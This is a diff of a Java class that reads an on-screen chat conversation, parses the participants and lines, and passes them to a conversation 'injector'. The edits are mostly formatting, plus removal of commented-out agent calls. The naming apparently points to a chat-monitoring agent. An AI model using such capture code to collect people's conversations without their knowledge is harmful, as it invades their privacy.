@@ -34,9 +34,11 @@ public class ConversationScreen {
     /**
      * retrieves the screen, if it's the conversation one, calls the copy and
      * parses the content
-     * @param injector 
+     * 
+     * @param injector
      */
-    public void getConversationScreen(String newConversation, AConversationInjector injector) {
+    public void getConversationScreen(String newConversation,
+            AConversationInjector injector) {
 
         synchronized (busyLock) {
             if (busy) {
@@ -47,8 +49,6 @@ public class ConversationScreen {
         }
 
         try {
-
-  
             // parse della conversazione.
             // result e' un vettore di stringhe
             Vector result = parseConversation(newConversation, lastConversation);
@@ -66,14 +66,8 @@ public class ConversationScreen {
                 String partecipants = (String) result.elementAt(0);
                 Vector lines = (Vector) result.elementAt(1);
 
-                //TODO: riabilitare
-                //ModuleChat agent = (ModuleChat) ModuleChat.getInstance();
-                //agent.add(partecipants, lines);
-                injector.addLines(partecipants,lines);
+                injector.addLines(partecipants, lines);
 
-                //if (Status.self().wantLight()) {
-                //    Debug.ledFlash(Debug.COLOR_YELLOW);
-                //}
             }
 
             /*
@@ -99,7 +93,6 @@ public class ConversationScreen {
         return;
     }
 
-   
     public static Vector parseConversation(String newConversation) {
         return parseConversation(newConversation, null);
     }
